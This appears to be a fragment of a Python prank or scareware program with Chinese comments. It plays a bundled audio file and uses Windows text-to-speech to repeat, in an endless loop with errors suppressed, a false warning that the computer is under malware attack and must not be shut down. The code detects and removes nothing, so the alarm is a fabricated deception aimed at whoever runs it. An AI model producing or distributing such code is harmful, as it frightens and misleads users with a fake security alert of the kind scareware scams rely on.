import sys # 导入系统模块 处理路径
from os import path # 导入系统模块 处理路径
from win32com.client import Dispatch # 导入win32com模块 实现语音朗读
from playsound import playsound # 导入playsound模块 播放音频文件


# 播放音频文件
def playAudio():
    try: playsound(path.join(sys._MEIPASS, "audio.mp3") if getattr(sys, 'frozen', False) else "static/audio/audio.mp3") # 播放音频文件
    except: pass # 忽略错误


# 朗读文本
def speakText():
    try: 
        speaker = Dispatch("SAPI.SpVoice") # 实例化语音对象
        while True: speaker.Speak("计算机正在遭受恶意软件攻击，系统正在努力清除恶意程序，请勿关闭计算机！") # 朗读文本
    except: pass # 忽略错误

